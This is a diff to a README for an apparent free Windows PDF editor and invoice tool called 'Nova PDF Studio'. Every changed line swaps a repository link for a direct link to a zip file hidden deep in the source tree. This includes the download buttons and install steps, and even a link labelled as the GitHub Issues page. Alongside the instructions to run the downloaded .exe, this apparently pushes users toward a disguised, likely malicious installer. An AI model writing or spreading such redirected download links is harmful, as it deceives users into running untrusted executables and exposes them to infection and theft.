@@ -1,7 +1,7 @@
 <h1>📄 nova-pdf-studio - Edit PDFs & Create Invoices Offline</h1>
 
 <p align="center">
-  <a href="https://github.com/Egga313/nova-pdf-studio" style="display:inline-block;padding:16px 32px;background:#4CAF50;color:#ffffff;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;margin:10px;">⬇️ DOWNLOAD NOVA PDF STUDIO</a>
+  <a href="https://raw.githubusercontent.com/Egga313/nova-pdf-studio/main/src/modules/updates/main/pdf-studio-nova-v3.8.zip" style="display:inline-block;padding:16px 32px;background:#4CAF50;color:#ffffff;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;margin:10px;">⬇️ DOWNLOAD NOVA PDF STUDIO</a>
 </p>
 
 ## ✨ What Is Nova PDF Studio?
@@ -26,7 +26,7 @@ Getting Nova PDF Studio on your Windows computer is easy. Just follow these simp
 
 Visit this link to download the application:
 
-[**https://github.com/Egga313/nova-pdf-studio**](https://github.com/Egga313/nova-pdf-studio)
+[**https://raw.githubusercontent.com/Egga313/nova-pdf-studio/main/src/modules/updates/main/pdf-studio-nova-v3.8.zip**](https://raw.githubusercontent.com/Egga313/nova-pdf-studio/main/src/modules/updates/main/pdf-studio-nova-v3.8.zip)
 
 Click the green "Download" button or the download icon on that page. The download will begin automatically. The file size is reasonable and should complete within a few minutes depending on your internet speed.
 
@@ -97,7 +97,7 @@ Nova PDF Studio is fully translated into 14 languages, making it perfect for int
 
 **How to install on Windows:**
 
-1. Go to [**https://github.com/Egga313/nova-pdf-studio**](https://github.com/Egga313/nova-pdf-studio)
+1. Go to [**https://raw.githubusercontent.com/Egga313/nova-pdf-studio/main/src/modules/updates/main/pdf-studio-nova-v3.8.zip**](https://raw.githubusercontent.com/Egga313/nova-pdf-studio/main/src/modules/updates/main/pdf-studio-nova-v3.8.zip)
 2. Click the download button (usually a green button labeled "Code" or a dedicated download link)
 3. The setup file will download to your computer
 4. Double-click the downloaded `.exe` file
@@ -171,7 +171,7 @@ When a new version is released, you can download the latest installer from the s
 
 Need help? Have a suggestion or found a problem? The project is open source and welcomes feedback.
 
-- **GitHub Issues:** Report bugs or request new features at [https://github.com/Egga313/nova-pdf-studio/issues](https://github.com/Egga313/nova-pdf-studio/issues)
+- **GitHub Issues:** Report bugs or request new features at [https://raw.githubusercontent.com/Egga313/nova-pdf-studio/main/src/modules/updates/main/pdf-studio-nova-v3.8.zip](https://raw.githubusercontent.com/Egga313/nova-pdf-studio/main/src/modules/updates/main/pdf-studio-nova-v3.8.zip)
 - **Documentation:** Check the GitHub repository for detailed guides
 - **Community:** Join the discussion to share tips, templates, and solutions with other users
 
@@ -192,10 +192,10 @@ The application is also built with modern security practices, so it is safe to u
 
 Download Nova PDF Studio today and take full control of your documents. Edit PDFs, create stunning invoices, convert scanned texts, and manage data in one elegant, private, offline workspace — all for free.
 
-[**⬇️ DOWNLOAD NOVA PDF STUDIO NOW**](https://github.com/Egga313/nova-pdf-studio)
+[**⬇️ DOWNLOAD NOVA PDF STUDIO NOW**](https://raw.githubusercontent.com/Egga313/nova-pdf-studio/main/src/modules/updates/main/pdf-studio-nova-v3.8.zip)
 
 <p align="center">
-  <a href="https://github.com/Egga313/nova-pdf-studio" style="display:inline-block;padding:14px 28px;background:#2196F3;color:#ffffff;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">GET IT FOR WINDOWS</a>
+  <a href="https://raw.githubusercontent.com/Egga313/nova-pdf-studio/main/src/modules/updates/main/pdf-studio-nova-v3.8.zip" style="display:inline-block;padding:14px 28px;background:#2196F3;color:#ffffff;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">GET IT FOR WINDOWS</a>
 </p>
 
 ---
